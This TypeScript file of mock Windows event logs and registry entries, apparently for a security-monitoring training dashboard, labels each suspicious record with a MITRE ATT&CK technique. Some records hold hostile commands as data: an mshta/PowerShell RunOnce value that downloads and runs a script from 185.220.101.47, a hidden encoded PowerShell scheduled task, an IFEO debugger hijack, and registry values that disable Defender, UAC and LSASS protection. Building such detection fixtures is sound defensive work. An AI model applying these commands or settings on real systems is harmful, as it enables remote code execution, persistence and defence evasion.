export type WindowsEventLog = {
  id: string;
  eventId: number;
  level: "Critical" | "Error" | "Warning" | "Information" | "Verbose";
  source: string;
  category: string;
  message: string;
  timestamp: number;
  computer: string;
  user: string;
  processId: number;
  threadId: number;
  mitreId?: string;
  mitreName?: string;
  suspicious: boolean;
  rawXml: string;
};

export type RegistryEntry = {
  id: string;
  hive: "HKLM" | "HKCU" | "HKCR" | "HKU" | "HKCC";
  path: string;
  name: string;
  type: "REG_SZ" | "REG_DWORD" | "REG_BINARY" | "REG_EXPAND_SZ" | "REG_MULTI_SZ";
  value: string;
  lastModified: number;
  suspicious: boolean;
  reason: string;
  mitreId?: string;
};

const t = Date.now();

export const WINDOWS_EVENT_TEMPLATES: Omit<WindowsEventLog, "id" | "timestamp">[] = [
  {
    eventId: 4625,
    level: "Warning",
    source: "Microsoft-Windows-Security-Auditing",
    category: "Logon",
    message: "An account failed to log on. Account: DOMAIN\\Administrator. Failure Reason: Unknown username or bad password. Logon Type: 3 (Network). Source Address: 185.220.101.47",
    computer: "DC01.corp.local",
    user: "SYSTEM",
    processId: 752,
    threadId: 1284,
    mitreId: "T1110",
    mitreName: "Brute Force",
    suspicious: true,
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
    <EventID>4625</EventID>
    <Level>0</Level>
    <Task>12544</Task>
    <Computer>DC01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-0-0</Data>
    <Data Name="SubjectUserName">-</Data>
    <Data Name="TargetUserName">Administrator</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="IpAddress">185.220.101.47</Data>
    <Data Name="FailureReason">%%2313</Data>
    <Data Name="Status">0xC000006D</Data>
    <Data Name="SubStatus">0xC0000064</Data>
  </EventData>
</Event>`
  },
  {
    eventId: 4698,
    level: "Warning",
    source: "Microsoft-Windows-Security-Auditing",
    category: "Scheduled Task",
    message: "A scheduled task was created. Task Name: \\Microsoft\\Windows\\SysUpdate. Task Content: cmd.exe /c powershell.exe -nop -w hidden -enc SQBFAFgA...",
    computer: "WS-FINANCE-04",
    user: "CORP\\jsmith",
    processId: 4816,
    threadId: 5924,
    mitreId: "T1053",
    mitreName: "Scheduled Task/Job",
    suspicious: true,
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4698</EventID>
    <Computer>WS-FINANCE-04</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">jsmith</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="TaskName">\\Microsoft\\Windows\\SysUpdate</Data>
    <Data Name="TaskContent">
      &lt;Actions&gt;&lt;Exec&gt;&lt;Command&gt;cmd.exe&lt;/Command&gt;
      &lt;Arguments&gt;/c powershell.exe -nop -w hidden -enc SQBFAFgA&lt;/Arguments&gt;
      &lt;/Exec&gt;&lt;/Actions&gt;
    </Data>
  </EventData>
</Event>`
  },
  {
    eventId: 1102,
    level: "Critical",
    source: "Microsoft-Windows-Eventlog",
    category: "Log Management",
    message: "The audit log was cleared. Subject Account Name: CORP\\svc_backup. This indicates potential evidence tampering.",
    computer: "SRV-FILES-01",
    user: "CORP\\svc_backup",
    processId: 9912,
    threadId: 2104,
    mitreId: "T1562",
    mitreName: "Impair Defenses",
    suspicious: true,
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Eventlog"/>
    <EventID>1102</EventID>
    <Level>4</Level>
    <Computer>SRV-FILES-01</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-5-21-392562890-192940813-3800127337-1104</Data>
    <Data Name="SubjectUserName">svc_backup</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="SubjectLogonId">0x55abc1</Data>
  </EventData>
</Event>`
  },
  {
    eventId: 4688,
    level: "Warning",
    source: "Microsoft-Windows-Security-Auditing",
    category: "Process Creation",
    message: "A new process has been created. Creator: C:\\Windows\\System32\\cmd.exe. New Process: C:\\Users\\Public\\svchost32.exe. Command Line: svchost32.exe -s update",
    computer: "WS-HR-11",
    user: "CORP\\alewis",
    processId: 3312,
    threadId: 4428,
    mitreId: "T1036",
    mitreName: "Masquerading",
    suspicious: true,
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4688</EventID>
    <Computer>WS-HR-11</Computer>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\\Users\\Public\\svchost32.exe</Data>
    <Data Name="ParentProcessName">C:\\Windows\\System32\\cmd.exe</Data>
    <Data Name="CommandLine">svchost32.exe -s update</Data>
    <Data Name="SubjectUserName">alewis</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="ProcessId">0xCF0</Data>
  </EventData>
</Event>`
  },
  {
    eventId: 4672,
    level: "Information",
    source: "Microsoft-Windows-Security-Auditing",
    category: "Special Logon",
    message: "Special privileges assigned to new logon. Account: CORP\\svc_sql. Privileges: SeDebugPrivilege SeImpersonatePrivilege SeTcbPrivilege.",
    computer: "DB-PROD-02",
    user: "CORP\\svc_sql",
    processId: 644,
    threadId: 1288,
    mitreId: "T1134",
    mitreName: "Access Token Manipulation",
    suspicious: true,
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4672</EventID>
    <Computer>DB-PROD-02</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">svc_sql</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="SubjectLogonId">0x3E7</Data>
    <Data Name="PrivilegeList">SeDebugPrivilege
SeImpersonatePrivilege
SeTcbPrivilege
SeAssignPrimaryTokenPrivilege</Data>
  </EventData>
</Event>`
  },
  {
    eventId: 4720,
    level: "Warning",
    source: "Microsoft-Windows-Security-Auditing",
    category: "User Account Management",
    message: "A user account was created. New Account: CORP\\svc_helpdesk99. Creator: CORP\\alewis. Created outside business hours (02:34 UTC).",
    computer: "DC01.corp.local",
    user: "CORP\\alewis",
    processId: 752,
    threadId: 1284,
    mitreId: "T1136",
    mitreName: "Create Account",
    suspicious: true,
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4720</EventID>
    <Computer>DC01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">svc_helpdesk99</Data>
    <Data Name="TargetDomainName">CORP</Data>
    <Data Name="SubjectUserName">alewis</Data>
    <Data Name="SubjectDomainName">CORP</Data>
    <Data Name="SubjectLogonId">0x1C32FA</Data>
  </EventData>
</Event>`
  },
  {
    eventId: 7045,
    level: "Warning",
    source: "Service Control Manager",
    category: "System",
    message: "A new service was installed. Service Name: WindowsBackup32. Service File Name: C:\\Users\\Public\\Downloads\\winupdate.exe. Service Type: kernel mode driver.",
    computer: "SRV-WEB-03",
    user: "SYSTEM",
    processId: 492,
    threadId: 524,
    mitreId: "T1543",
    mitreName: "Create or Modify System Process",
    suspicious: true,
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Service Control Manager"/>
    <EventID>7045</EventID>
    <Computer>SRV-WEB-03</Computer>
  </System>
  <EventData>
    <Data Name="ServiceName">WindowsBackup32</Data>
    <Data Name="ImagePath">C:\\Users\\Public\\Downloads\\winupdate.exe</Data>
    <Data Name="ServiceType">kernel mode driver</Data>
    <Data Name="StartType">auto start</Data>
    <Data Name="AccountName">LocalSystem</Data>
  </EventData>
</Event>`
  },
  {
    eventId: 4624,
    level: "Information",
    source: "Microsoft-Windows-Security-Auditing",
    category: "Logon",
    message: "An account was successfully logged on. Account: CORP\\backup_svc. Logon Type: 10 (RemoteInteractive). Source: 10.10.8.47. This is a normal service logon.",
    computer: "SRV-BACKUP-01",
    user: "CORP\\backup_svc",
    processId: 752,
    threadId: 1284,
    suspicious: false,
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4624</EventID>
    <Computer>SRV-BACKUP-01</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">backup_svc</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="IpAddress">10.10.8.47</Data>
    <Data Name="LogonProcessName">User32</Data>
  </EventData>
</Event>`
  },
  {
    eventId: 1116,
    level: "Critical",
    source: "Microsoft-Windows-Windows Defender",
    category: "Antivirus",
    message: "Microsoft Defender Antivirus has detected malware. Name: Trojan:Win32/Mimikatz.A. Severity: Severe. Category: Password Stealer. Path: C:\\Users\\jdoe\\AppData\\Local\\Temp\\mim.exe.",
    computer: "WS-IT-22",
    user: "CORP\\jdoe",
    processId: 1816,
    threadId: 2040,
    mitreId: "T1003",
    mitreName: "OS Credential Dumping",
    suspicious: true,
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Windows Defender"/>
    <EventID>1116</EventID>
    <Computer>WS-IT-22</Computer>
  </System>
  <EventData>
    <Data Name="Threat Name">Trojan:Win32/Mimikatz.A</Data>
    <Data Name="Severity">5</Data>
    <Data Name="Category">8</Data>
    <Data Name="Path">C:\\Users\\jdoe\\AppData\\Local\\Temp\\mim.exe</Data>
    <Data Name="Detection User">CORP\\jdoe</Data>
    <Data Name="Action">4624</Data>
  </EventData>
</Event>`
  },
  {
    eventId: 4769,
    level: "Warning",
    source: "Microsoft-Windows-Security-Auditing",
    category: "Kerberos",
    message: "A Kerberos service ticket was requested. Account: CORP\\analyst1. Service Name: MSSQLSvc/db-prod-02:1433. Ticket Encryption: 0x17 (RC4-HMAC) – potential Kerberoasting.",
    computer: "DC01.corp.local",
    user: "CORP\\analyst1",
    processId: 752,
    threadId: 1288,
    mitreId: "T1558",
    mitreName: "Steal or Forge Kerberos Tickets",
    suspicious: true,
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4769</EventID>
    <Computer>DC01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">analyst1</Data>
    <Data Name="ServiceName">MSSQLSvc/db-prod-02:1433</Data>
    <Data Name="TicketEncryptionType">0x17</Data>
    <Data Name="IpAddress">::ffff:10.10.44.91</Data>
    <Data Name="Status">0x0</Data>
  </EventData>
</Event>`
  },
];

export const REGISTRY_ENTRIES: RegistryEntry[] = [
  {
    id: "reg-001",
    hive: "HKCU",
    path: "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    name: "WindowsUpdateHelper",
    type: "REG_SZ",
    value: "C:\\Users\\Public\\Downloads\\winupdate.exe /silent",
    lastModified: t - 1_800_000,
    suspicious: true,
    reason: "Unsigned executable in public directory added to autorun key. Matches T1547.001 persistence pattern.",
    mitreId: "T1547"
  },
  {
    id: "reg-002",
    hive: "HKLM",
    path: "SYSTEM\\CurrentControlSet\\Services\\WindowsBackup32",
    name: "ImagePath",
    type: "REG_EXPAND_SZ",
    value: "C:\\Users\\Public\\Downloads\\winupdate.exe",
    lastModified: t - 3_600_000,
    suspicious: true,
    reason: "New service registered pointing to user-writable directory. Matches T1543.003 service persistence.",
    mitreId: "T1543"
  },
  {
    id: "reg-003",
    hive: "HKLM",
    path: "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe",
    name: "Debugger",
    type: "REG_SZ",
    value: "C:\\Windows\\Temp\\payload.exe",
    lastModified: t - 900_000,
    suspicious: true,
    reason: "IFEO Debugger hijack on svchost.exe – classic T1546.012 execution technique for persistence.",
    mitreId: "T1546"
  },
  {
    id: "reg-004",
    hive: "HKLM",
    path: "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
    name: "EnableLUA",
    type: "REG_DWORD",
    value: "0x00000000",
    lastModified: t - 7_200_000,
    suspicious: true,
    reason: "UAC fully disabled. This weakens the privilege escalation barrier and matches T1548.002.",
    mitreId: "T1548"
  },
  {
    id: "reg-005",
    hive: "HKLM",
    path: "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
    name: "DisableRealtimeMonitoring",
    type: "REG_DWORD",
    value: "0x00000001",
    lastModified: t - 2_100_000,
    suspicious: true,
    reason: "Windows Defender real-time protection disabled via registry. T1562.001 defense evasion indicator.",
    mitreId: "T1562"
  },
  {
    id: "reg-006",
    hive: "HKLM",
    path: "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
    name: "RegisteredOwner",
    type: "REG_SZ",
    value: "Microsoft Corporation",
    lastModified: t - 86_400_000,
    suspicious: false,
    reason: "Standard OS registration key. No anomaly detected.",
  },
  {
    id: "reg-007",
    hive: "HKCU",
    path: "Software\\Microsoft\\Office\\16.0\\Word\\Security",
    name: "VBAWarnings",
    type: "REG_DWORD",
    value: "0x00000001",
    lastModified: t - 4_500_000,
    suspicious: true,
    reason: "Office macro security disabled via registry. Matches T1137 / T1566.001 phishing payload execution pattern.",
    mitreId: "T1137"
  },
  {
    id: "reg-008",
    hive: "HKLM",
    path: "SYSTEM\\CurrentControlSet\\Control\\Lsa",
    name: "RunAsPPL",
    type: "REG_DWORD",
    value: "0x00000000",
    lastModified: t - 5_400_000,
    suspicious: true,
    reason: "LSASS Protected Process Light (PPL) disabled. Makes LSASS memory accessible to credential dumpers. T1003.001.",
    mitreId: "T1003"
  },
  {
    id: "reg-009",
    hive: "HKLM",
    path: "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",
    name: "EnableScriptBlockLogging",
    type: "REG_DWORD",
    value: "0x00000001",
    lastModified: t - 172_800_000,
    suspicious: false,
    reason: "PowerShell script block logging correctly enabled. Good security posture.",
  },
  {
    id: "reg-010",
    hive: "HKCU",
    path: "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    name: "SysConfigUpdate",
    type: "REG_SZ",
    value: "mshta.exe vbscript:CreateObject(\"Wscript.Shell\").Run(\"powershell -nop -c IEX((New-Object Net.WebClient).DownloadString('http://185.220.101.47/p.ps1'))\",0,True)(window.close)",
    lastModified: t - 600_000,
    suspicious: true,
    reason: "MSHTA executing remote PowerShell via RunOnce key. Active C2 dropper. T1218.005 + T1547.001.",
    mitreId: "T1218"
  },
];

export function generateRandomEvent(baseTimestamp: number): WindowsEventLog {
  const template = WINDOWS_EVENT_TEMPLATES[Math.floor(Math.random() * WINDOWS_EVENT_TEMPLATES.length)];
  return {
    ...template,
    id: `evt-${Math.random().toString(36).slice(2, 10)}`,
    timestamp: baseTimestamp - Math.floor(Math.random() * 120_000),
  };
}
